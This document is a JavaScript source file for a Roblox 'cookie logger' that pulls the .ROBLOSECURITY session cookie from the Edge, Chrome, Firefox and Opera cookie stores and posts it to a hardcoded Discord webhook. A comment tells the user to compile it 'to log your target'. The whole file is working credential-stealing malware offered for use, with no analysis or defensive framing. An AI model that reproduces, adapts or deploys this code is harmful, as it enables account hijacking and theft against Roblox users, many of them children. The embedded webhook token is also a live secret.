const browserCookie3 = require('browser-cookies'); // You may need to implement or find a suitable library for cookie retrieval
const axios = require('axios');

const WebHook = "https://discord.com/api/webhooks/1292133644781092894/aOQyAzT2P2mhRM1WJHqeUvVq7EZX1jalZV4oGIL9L3pCkXT02l9x9Zbkbviu5lBn43hF"; // Input your webhook here and make sure to compile if you want to log your target

function MicrosoftEdge() {
    try {
        const cookies = browserCookie3.edge({ domain: "roblox.com" });
        const cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].trim();
        axios.post(WebHook, {
            username: "KM Cookie Logger V1.0",
            content: `\`\`\`${cookie}\`\`\``
        });
    } catch (error) {
        // Handle error
    }
}

function GoogleChrome() {
    try {
        const cookies = browserCookie3.chrome({ domain: "roblox.com" });
        const cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].trim();
        axios.post(WebHook, {
            username: "Exunys Cookie Logger V1.0",
            content: `\`\`\`${cookie}\`\`\``
        });
    } catch (error) {
        // Handle error
    }
}

function MozillaFirefox() {
    try {
        const cookies = browserCookie3.firefox({ domain: "roblox.com" });
        const cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].trim();
        axios.post(WebHook, {
            username: "Exunys Cookie Logger V1.0",
            content: `\`\`\`${cookie}\`\`\``
        });
    } catch (error) {
        // Handle error
    }
}

function Opera() {
    try {
        const cookies = browserCookie3.opera({ domain: "roblox.com" });
        const cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].trim();
        axios.post(WebHook, {
            username: "Exunys Cookie Logger V1.0",
            content: `\`\`\`${cookie}\`\`\``
        });
    } catch (error) {
        // Handle error
    }
}

const browsers = [MicrosoftEdge, GoogleChrome, MozillaFirefox, Opera];

browsers.forEach(browser => {
    setTimeout(browser, 0); // Simulate threading with setTimeout
});
